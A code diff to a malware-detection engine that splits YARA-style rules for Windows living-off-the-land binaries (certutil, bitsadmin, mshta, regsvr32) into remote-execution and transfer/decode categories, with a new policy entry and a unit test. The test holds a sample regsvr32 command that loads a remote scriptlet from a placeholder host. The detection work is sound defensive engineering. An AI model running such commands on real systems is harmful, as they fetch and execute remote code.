@@ -41,10 +41,17 @@ rule blackshard_powershell_amsi_bypass_sequence {
 
 rule blackshard_lolbin_remote_execution_command {
     strings:
-        $certutil = /certutil(\.exe)?\s+[^\r\n]{0,100}(-urlcache|-decode)/ ascii nocase
-        $bitsadmin = /bitsadmin(\.exe)?\s+[^\r\n]{0,100}\/transfer/ ascii nocase
+        $certutil = /certutil(\.exe)?\s+[^\r\n]{0,100}-urlcache/ ascii nocase
         $mshta = /mshta(\.exe)?\s+(https?:|javascript:|vbscript:)/ ascii nocase
         $regsvr = /regsvr32(\.exe)?\s+[^\r\n]{0,160}\/i:https?:/ ascii nocase
+    condition:
+        any of them
+}
+
+rule blackshard_lolbin_transfer_or_decode {
+    strings:
+        $certutil = /certutil(\.exe)?\s+[^\r\n]{0,100}-decode/ ascii nocase
+        $bitsadmin = /bitsadmin(\.exe)?\s+[^\r\n]{0,100}\/transfer/ ascii nocase
     condition:
         any of them
 }
@@ -247,6 +254,13 @@ fn builtin_policies() -> HashMap<String, RulePolicy> {
             "a Windows utility was configured to retrieve or execute remote content",
         ),
         (
+            "blackshard_lolbin_transfer_or_decode",
+            RuleDisposition::Suspicious,
+            30,
+            "Suspicious.LOLBin.TransferOrDecode",
+            "a Windows utility was configured to transfer or decode a file",
+        ),
+        (
             "blackshard_office_macro_autoexec_shell_chain",
             RuleDisposition::Suspicious,
             45,
@@ -364,6 +378,27 @@ mod tests {
         assert_eq!(
             matched[0].enforcement_authority,
             RuleEnforcementAuthority::AlertOnly
+        );
+    }
+
+    #[test]
+    fn remote_execution_and_admin_transfers_are_separate_rules() {
+        let engine = RuleEngine::builtin().unwrap();
+        let identifiers = |bytes: &[u8]| {
+            engine
+                .scan(bytes)
+                .unwrap()
+                .into_iter()
+                .map(|matched| matched.identifier)
+                .collect::<Vec<_>>()
+        };
+        assert_eq!(
+            identifiers(b"regsvr32 /s /n /u /i:https://example.invalid/x.sct scrobj.dll"),
+            ["blackshard_lolbin_remote_execution_command"]
+        );
+        assert_eq!(
+            identifiers(b"certutil -decode cert.b64 cert.cer"),
+            ["blackshard_lolbin_transfer_or_decode"]
         );
     }
 }
